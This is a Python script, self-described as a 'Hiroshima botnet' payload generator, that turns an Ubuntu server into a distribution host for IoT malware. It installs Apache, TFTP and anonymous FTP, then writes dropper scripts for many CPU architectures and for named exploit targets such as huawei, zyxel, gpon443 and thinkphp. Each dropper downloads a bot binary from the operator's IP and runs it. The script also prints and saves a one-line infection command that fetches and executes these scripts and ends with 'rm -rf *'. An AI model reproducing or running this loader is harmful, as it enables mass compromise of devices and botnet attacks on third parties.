import subprocess, sys, urllib
import os

ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "76d32be0"
exec_name = "payload"
bin_prefix = "db0fa4b8db0333367e9bda3ab68b8042."
bin_directory = "596a96cc7bf9108cd896f33c44aedc8a"
archs = ["x86", "mips", "mpsl", "arm", "arm5", "arm6", "arm7",
         "ppc", "m68k", "spc", "i686", "sh4", "arc"]

def run(cmd):
    subprocess.call(cmd, shell=True)

print("\033[01;37mHiroshima botnet generating payload for Ubuntu.")
print(" ")

# Update & install required packages
run("apt-get update -y &> /dev/null")
run("apt-get install apache2 -y &> /dev/null")
run("systemctl start apache2 &> /dev/null")
run("apt-get install xinetd tftpd-hpa tftp-hpa -y &> /dev/null")
run("apt-get install vsftpd -y &> /dev/null")
run("systemctl start vsftpd &> /dev/null")

# Buat direktori tftpboot jika belum ada
if not os.path.exists("/var/lib/tftpboot"):
    os.makedirs("/var/lib/tftpboot")
run("chmod 777 /var/lib/tftpboot")

# Konfigurasi tftp untuk xinetd (Ubuntu biasanya pakai tftpd-hpa, tapi kita konfigurasi xinetd)
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
	user                    = root
	server                  = /usr/sbin/in.tftpd
	server_args             = -s -c /var/lib/tftpboot
	disable                 = no
	per_source              = 11
	cps                     = 100 2
	flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("systemctl restart xinetd &> /dev/null")

# Buat direktori untuk ftp anonymous (Ubuntu default /srv/ftp, tapi kita pakai /var/ftp agar kompatibel)
if not os.path.exists("/var/ftp"):
    os.makedirs("/var/ftp")
run("chmod 777 /var/ftp")

# Konfigurasi vsftpd untuk anonymous
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address=''' + ip + '''
listen_port=21" > /etc/vsftpd.conf''')
run("systemctl restart vsftpd &> /dev/null")

print("Creating .sh Bins")
print(" ")

# Pastikan direktori web dan tftp/ftp tersedia
for d in ["/var/www/html", "/var/lib/tftpboot", "/var/ftp"]:
    if not os.path.exists(d):
        os.makedirs(d)

# Buat file .sh awal
run('echo "#!/bin/bash" > /var/lib/tftpboot/76d32be0.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/76d32be0.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/76d32be0.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/76d32be02.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/76d32be02.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/76d32be02.sh')

run('echo "#!/bin/bash" > /var/ftp/76d32be01.sh')
run('echo "ulimit -n 1024" >> /var/ftp/76d32be01.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/76d32be01.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/jaws')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jaws')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jaws')

# Buat file di web
for f in ["76d32be0.sh", "yarn", "hnap", "aws", "gpon443", "huawei",
          "zyxel", "zte", "realtek", "pulse", "lg", "goahead", "thinkphp", "jaws"]:
    run('echo "#!/bin/bash" > /var/www/html/{}'.format(f))

# Loop untuk setiap arsitektur
for i in archs:
    # HTTP/HTTPS (wget/curl) untuk berbagai file exploit
    for target in ["76d32be0.sh", "aws", "lg", "jaws", "hnap", "pulse", "gpon443",
                   "thinkphp", "huawei", "zte", "yarn", "zyxel", "realtek", "goahead"]:
        cmd = ('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; '
               'wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; '
               'curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; '
               'cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+target+'" >> /var/www/html/'+target)
        run(cmd)

    # FTP
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; '
        'ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; '
        'cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/76d32be01.sh')

    # TFTP (2 versi)
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; '
        'tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; '
        'chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/76d32be0.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; '
        'tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; '
        'chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/76d32be02.sh')

    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; '
        'tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; '
        'chmod +x *; ./'+exec_bin+' jaws.exploit" >> /var/lib/tftpboot/jaws')

# Restart layanan
run("systemctl restart xinetd &> /dev/null")
run("systemctl restart apache2 &> /dev/null")
run('echo -e "ulimit -n 999999; ulimit -u 999999; ulimit -e 999999" >> ~/.bashrc')

print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/76d32be0.sh; curl -O http://" + ip + "/76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp " + ip + " -c get 76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp -r 76d32be02.sh -g " + ip + "; chmod 777 76d32be02.sh; sh 76d32be02.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 76d32be01.sh 76d32be01.sh; sh 76d32be01.sh; rm -rf 76d32be0.sh 76d32be0.sh 76d32be02.sh 76d32be01.sh; rm -rf *\x1b[0m")
print("")

complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/76d32be0.sh; curl -O http://" + ip + "/76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp " + ip + " -c get 76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp -r 76d32be02.sh -g " + ip + "; chmod 777 76d32be02.sh; sh 76d32be02.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 76d32be01.sh 76d32be01.sh; sh 76d32be01.sh; rm -rf 76d32be0.sh 76d32be0.sh 76d32be02.sh 76d32be01.sh; rm -rf *")
with open("payload.txt","w+") as f:
    f.write(complete_payload)

print("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")